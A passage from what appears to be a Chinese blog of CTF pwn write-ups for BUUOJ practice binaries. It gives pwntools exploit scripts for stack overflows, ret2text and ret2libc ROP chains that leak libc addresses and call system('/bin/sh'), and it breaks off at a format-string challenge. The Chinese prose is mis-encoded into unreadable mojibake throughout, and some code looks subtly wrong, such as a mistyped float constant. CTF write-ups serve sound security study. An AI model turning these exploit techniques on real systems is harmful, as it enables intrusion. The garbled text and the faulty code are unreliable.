å°†v3æ‹·è´åˆ°sä¸Š</span></span><br></pre></td></tr></table></figure><p>ç®€å•è¿è¡Œä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºçš„ç¡®ä¼šæŠŠè¾“å…¥ä¸­çš„<code>I</code>å…¨éƒ¨æ›¿æ¢æˆ<code>you</code></p><p><img src="https://i.loli.net/2020/09/07/EkemdSOlb9Jj5IM.png" alt="image.png"></p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæº¢å‡ºå¤§æ¦‚éœ€è¦<code>0x3c</code>ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯60ä¸ªå­—èŠ‚</p><p><img src="https://i.loli.net/2020/09/07/7iJUWvxtPjVlckS.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨20ä¸ª<code>I</code>ä½œä¸ºpaddingï¼Œç„¶åè¿™æ®µpaddingä¼šè¢«æ›¿æ¢æˆ30ä¸ª<code>you</code>ï¼Œåˆšå¥½60ä¸ªå­—èŠ‚ï¼Œåœ¨åé¢å†è¦†ç›–æ‰ebpä¸è¿”å›åœ°å€æ§åˆ¶ç¨‹åºè¿”å›åˆ°<code>get_flag</code>å‡½æ•°å³å¯å¾—åˆ°flag</p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">get_flag_addr = <span class="number">0x8048fd</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn1_sctf_2016&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27140)</span></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(get_flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>å‘é€payloadï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/09/07/nZcqDhPo5sFWm6X.png" alt="image.png"></p><blockquote><p>C++é€†å‘æ˜¯çœŸçš„kskjklasjdkajskdhasjdgsgdhsgdsajkqpiwourevz</p></blockquote><h1 id="0x005-ciscn-2019-n-1-overwrite"><a href="#0x005-ciscn-2019-n-1-overwrite" class="headerlink" title="0x005.ciscn_2019_n_1 - overwrite"></a>0x005.ciscn_2019_n_1 - overwrite</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/08/IlHxaAwpoKmFdJ5.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œmainä¸­è°ƒç”¨äº†funcå‡½æ•°ï¼Œç›´æ¥è¿›å»çœ‹</p><p><img src="https://i.loli.net/2020/09/08/RyLZ98UPXJp4jQh.png" alt="image.png"></p><p>å½“v2ä¸º11.28125æ—¶æˆ‘ä»¬å¯ä»¥è·å–flagï¼Œè€Œgetså‡½æ•°è¯»å…¥åˆ°v1å­˜åœ¨æº¢å‡ºç‚¹å¯ä»¥è¦†å†™æ‰v2</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ<strong>æµ®ç‚¹æ•°11.28125åœ¨å†…å­˜ä¸­æ˜¯å¦‚ä½•è¡¨ç¤ºçš„å‘¢</strong></p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥è·³è½¬åˆ°è¿™ä¸ªæ•°æ®æ‰€å‚¨å­˜çš„åœ°æ–¹ï¼Œå‘ç°æ˜¯<code>0x41348000</code></p><p><img src="https://i.loli.net/2020/09/08/wvTE9Qhr18oXU6Z.png" alt="image.png"></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;ciscn_2019_n_1&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,27338)</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x30</span>-<span class="number">0xc</span>) + p64(<span class="number">0x401348000</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>å‘é€payloadï¼Œå¾—åˆ°flag</p><p><img src="https://i.loli.net/2020/09/08/bQk98h4CdTyFAa5.png" alt="image.png"></p><h1 id="0x006-ciscn-2019-c-1-ret2csu-ret2libc"><a href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc" class="headerlink" title="0x006.ciscn_2019_c_1 - ret2csu + ret2libc"></a>0x006.ciscn_2019_c_1 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/08/pAfovxLnPF3Cicu.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p><p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p><p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p><p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line">enc_addr = <span class="number">0x4009a0</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeafbeef</span>) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(retn) + p64(pop_rdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(enc_addr)</span><br><span class="line"><span class="comment">#p = process(&quot;./ciscn_2019_c_1&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27832</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n\n&#x27;</span>)</span><br><span class="line">s = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_addr = u64(s.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) + p64(pop_rdi) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œæˆ‘ä»¬çš„expï¼ŒæˆåŠŸgetshell</p><p><img src="https://i.loli.net/2020/09/10/CL1T3UiExsyJbVP.png" alt="image.png"></p><blockquote><p>å‘ç”Ÿäº†å¾ˆå¤šå¾ˆç„å­¦çš„é—®é¢˜ï¼ˆğŸ‘ˆå…¶å®å°±æ˜¯æç²—å¿ƒå¤§æ„ç½¢leï¼‰ï¼Œå¯¼è‡´è¿™é“é¢˜è™½ç„¶æ—©å°±æœ‰äº†æ€è·¯ï¼Œä½†æ˜¯ç”¨çš„æ—¶é—´æ¯”é¢„æœŸè¦é•¿çš„å¤š</p><p>ä»¥åŠLibcSearcheråœ¨æœ¬åœ°æ— æ³•getshellï¼Œæ¢æˆæœ¬åœ°çš„libcå°±å¥½äº†ï¼ˆç„å­¦é—®é¢˜å˜å¤šäº†ï¼ˆ<del>å…¶å®åªæ˜¯LibcSearcheråº“ä¸å…¨â‘§</del>ï¼‰ï¼‰</p><p>ä»¥åŠUbuntu 18ä¸‹å¶å°”ä¼šå‘ç”Ÿæ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¤šretnå‡ æ¬¡å°±å¥½äº†ï¼ˆç¡®ä¿¡ï¼‰</p></blockquote><h1 id="0x007-OGeek2019-babyrop-ret2libc"><a href="#0x007-OGeek2019-babyrop-ret2libc" class="headerlink" title="0x007.[OGeek2019]babyrop - ret2libc"></a>0x007.[OGeek2019]babyrop - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/12/nqPDwE5WHeQsmzT.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p><p><img src="https://i.loli.net/2020/09/12/51JOmdMVjsgAkWN.png" alt="image.png"></p><p>mainå‡½æ•°é¦–å…ˆä¼šè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œä¼ å…¥<code>sub_804871F()</code>ä¸­</p><p><img src="https://i.loli.net/2020/09/12/Ijk8GHiOgxXWVdn.png" alt="image.png"></p><p>è¯¥å‡½æ•°ä¼šå°†éšæœºæ•°ä½œä¸ºå­—ç¬¦ä¸²è¾“å‡ºåˆ°sï¼Œä¹‹åè¯»å–æœ€å¤§0x20ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°v6ï¼Œç”¨<code>strlen()</code>è®¡ç®—v6é•¿åº¦å­˜åˆ°v1å¹¶ä¸sæ¯”å¯¹v1ä¸ªå­—èŠ‚ï¼Œè‹¥ä¸ç›¸åŒåˆ™ç›´æ¥é€€å‡ºç¨‹åº</p><p>è€ƒè™‘åˆ°<code>strlen()</code>å‡½æ•°ä»¥<code>&#39;\x00&#39;</code>å­—ç¬¦ä½œä¸ºç»“æŸæ ‡è¯†ç¬¦ï¼Œæ•…æˆ‘ä»¬åªéœ€è¦åœ¨è¾“å…¥å‰æ”¾ä¸Šä¸€ä¸ª<code>&#39;\x00&#39;</code>å³å¯é¿å¼€è¿™ä¸ªæ£€æµ‹</p><p>ä¹‹åä¼šå°†v5çš„æ•°å€¼è¿”å›åˆ°ä¸»å‡½æ•°å¹¶ä½œä¸ºå‚æ•°åˆç»™åˆ°<code>sub_80487D0()</code>å‡½æ•°ï¼Œç®€å•çœ‹ä¸€ä¸‹æˆ‘ä»¬ä¾¿å¯ä»¥å‘ç°è¯¥å‡½æ•°è¯»å–æœ€å¤§v5ä¸ªå­—èŠ‚çš„è¾“å…¥åˆ°<code>buf</code>ä¸­ï¼Œè€Œ<code>buf</code>è·ç¦»<code>ebp</code>åªæœ‰0xe7ä¸ªå­—èŠ‚</p><p><img src="https://i.loli.net/2020/09/13/1Y7qukt6NVJlDzd.png" alt="image.png"></p><p>ç”±äºæ²¡æœ‰å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼Œæ•…è€ƒè™‘åœ¨ç¬¬ä¸€æ¬¡è¾“å…¥æ—¶å°†v5è¦†å†™ä¸º<code>0xff</code>ä»¥ä¿è¯èƒ½å¤Ÿè¯»å–çš„è¾“å…¥é•¿åº¦æœ€å¤§ï¼Œåœ¨ç¬¬äºŒæ¬¡è¾“å…¥æ—¶æ„é€ ropé“¾ä½¿ç”¨writeå‡½æ•°æ³„éœ²writeçš„åœ°å€ï¼Œå†ä½¿ç”¨libcsearcherå¾—åˆ°libcåŸºå€ä¸<code>system()</code>å’Œ<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²çš„åœ°å€ï¼Œæœ€åæ„é€ ropé“¾è°ƒç”¨<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">write_plt = e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="number">7</span>* <span class="string">b&#x27;\xff&#x27;</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(write_plt) + p32(<span class="number">0x80487d0</span>) + p32(<span class="number">0x1</span>) + p32(write_got) + p32(<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,25330)</span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0xe7</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.sendline(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å³å¯getshell</p><p><img src="https://i.loli.net/2020/09/13/SOvMLpHGFVaQfZb.png" alt="image.png"></p><h1 id="0x008-jarvisoj-level0-ret2text"><a href="#0x008-jarvisoj-level0-ret2text" class="headerlink" title="0x008.jarvisoj_level0 - ret2text"></a>0x008.jarvisoj_level0 - ret2text</h1><blockquote><p>å¥½å¤šé‡å¤è€ƒç‚¹çš„ç®€å•é¢˜å•Šâ€¦</p></blockquote><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/18/utzZo2RkpGUC7Yj.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œå¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ªå¯ä»¥æº¢å‡ºçš„å‡½æ•°<code>vulnerable_function()</code>ï¼Œåªéœ€è¦<code>0x80</code>ä¸ªå­—èŠ‚å³å¯æº¢å‡º</p><p><img src="https://i.loli.net/2020/09/18/kFVOigZbem3U1yr.png" alt="image.png"></p><p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªå¯ä»¥ç›´æ¥getshellçš„å‡½æ•°<code>callsystem()</code></p><p>ç›´æ¥æ„é€ payloadè¦†å†™è¿”å›åœ°å€åˆ°<code>callsystem()</code>å‡½æ•°å³å¯getshell</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0x400596</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;level0&#x27;</span>)<span class="comment">#p = remote(&#x27;node3.buuoj.cn&#x27;,29367)</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/ykhU4DgzILKvQXG.png" alt="image.png"></p><h1 id="0x009-ciscn-2019-en-2-ret2csu-ret2libc"><a href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc" class="headerlink" title="0x009.ciscn_2019_en_2 - ret2csu + ret2libc"></a>0x009.ciscn_2019_en_2 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p><p><img src="https://i.loli.net/2020/09/18/Fv6MeQnd4fU8Rmr.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ<del>æ„Ÿè§‰è¿™é¢˜å¥½åƒåœ¨å“ªä¸ªåœ°æ–¹åšè¿‡çš„æ ·å­</del>ï¼ˆ<del>ciscn_2019_c_1</del>ï¼‰</p><p>åœ¨<code>encrypt()</code>å‡½æ•°ä¸­æˆ‘ä»¬å‘ç°ä½¿ç”¨äº†getsè¿›è¡Œè¯»å…¥ï¼Œå­˜åœ¨æº¢å‡ºç‚¹ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿåˆ°è¿™ä¸ªå‡½æ•°ä¼šå¯¹æˆ‘ä»¬çš„è¾“å…¥è¿›è¡Œå¤„ç†ï¼Œå¸¸è§„çš„payloadä¼šè¢«ç»è¿‡ç¨‹åºå¥‡æ€ªçš„å¤„ç†ï¼Œç ´åæ‰æˆ‘ä»¬çš„æ•°æ®<img src="https://i.loli.net/2020/09/08/TXCd5VxRIm2Nbfy.png" alt="image.png"></p><p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°è¯¥å‡½æ•°æ˜¯ä½¿ç”¨çš„<code>strlen()</code>å‡½æ•°æ¥åˆ¤æ–­è¾“å…¥çš„é•¿åº¦ï¼Œé‡åˆ°<code>&#39;\x00&#39;</code>æ—¶ä¼šç»ˆæ­¢ï¼Œè€Œ<code>gets()</code>å‡½æ•°é‡åˆ°<code>&#39;\x00&#39;</code>å¹¶ä¸ä¼šæˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†payloadå¼€å¤´çš„paddingçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ç½®ä¸º<code>&#39;\x00&#39;</code>ï¼Œè¿™æ ·æˆ‘ä»¬æ‰€è¾“å…¥çš„payloadå°±ä¸ä¼šè¢«ç¨‹åºæ”¹å˜</p><p>æ¥ä¸‹æ¥è€ƒè™‘æ„é€ ropé“¾getshellï¼ŒåŸºæœ¬ä¸Šå·²ç»æ˜¯å›ºå®šå¥—è·¯äº†ï¼Œ<strong>é¦–å…ˆç”¨<code>puts()</code>å‡½æ•°æ³„æ¼å‡º<code>puts()</code>çš„çœŸå®åœ°å€ï¼ŒåŒæ—¶ç”±äºé¢˜ç›®æ²¡æœ‰ç»™å‡ºlibcæ–‡ä»¶ï¼Œæ•…æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘ç”¨<code>LibcSearcher</code>è·å–libcï¼Œç„¶ålibcçš„åŸºå€ã€<code>/bin/sh</code>å’Œ<code>system()</code>çš„åœ°å€å°±éƒ½å‡ºæ¥äº†ï¼Œé…åˆä¸Šcsuä¸­çš„gadgetå³å¯getshell</strong></p><p>æ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25348</span>)<span class="comment">#process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_2019_en_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x400b28</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">retn = <span class="number">0x400c84</span></span><br><span class="line">offset = <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;text\n\n&#x27;</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span>*(offset-<span class="number">1</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(retn) +p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/7AoReBMP9Lr3Ojb.png" alt="image.png"></p><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯Ubuntu 18æœ‰çš„æ—¶å€™ä¼šå­˜åœ¨æ ˆæ— æ³•å¯¹é½çš„æƒ…å†µï¼Œå¯ä»¥å¤šä½¿ç”¨å‡ æ¬¡<code>retn</code>çš„gadgetæ¥å¯¹å…¶æ ˆ</p></blockquote><h1 id="0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr"><a href="#0x00A-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5-fmtstr" class="headerlink" title="0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr"></a>0x00A.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5 - fmtstr</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å¼€äº†NXä¿æŠ¤å’Œcanary</p><p><img src="https://i.loli.net/2020/09/18/UyvYwOl6x1RH4hE.png" alt="image.png"></p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼š</p><p><img src="https://i.loli.net/2020/09/18/ZweqQ3kByjGUmVK.png" alt="image.png"></p><p>è¯¥ç¨‹åºè·å–ä¸€ä¸ªéšæœºæ•°ï¼Œè¯»å…¥åˆ°<code>0x804c044</code>ä¸Šï¼Œéšåä¸¤æ¬¡è¯»å…¥ç”¨æˆ·è¾“å…¥å¹¶åˆ¤æ–­ç¬¬äºŒæ¬¡è¾“å…¥ä¸éšæœºæ•°æ˜¯å¦ç›¸åŒï¼Œç›¸åŒåˆ™å¯ä»¥è·å¾—shell</p><p>æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</strong>ï¼Œå¯ä»¥è¿›è¡Œ<strong>ä»»æ„åœ°å€è¯»ä¸ä»»æ„åœ°å€å†™</strong>ï¼Œæ•…è€ƒè™‘å°†<code>0x804c044</code>åœ°å€ä¸Šçš„éšæœºæ•°è¦†å†™ä¸ºæˆ‘ä»¬æƒ³è¦çš„å€¼ï¼Œéšåç›´æ¥è¾“å…¥æˆ‘ä»¬è¦†å†™çš„å€¼å³å¯getshell</p><p>åŒæ—¶æˆ‘ä»¬ç®€å•çš„è·‘ä¸€ä¸‹è¿™ä¸ªç¨‹åºå°±å¯ä»¥çŸ¥é“æ ¼å¼å­—ç¬¦ä¸²æ˜¯ä½äºæ ˆä¸Šçš„ç¬¬10ä¸ªå‚æ•°ï¼ˆâ€aaaaâ€ &#x3D;&#x3D; 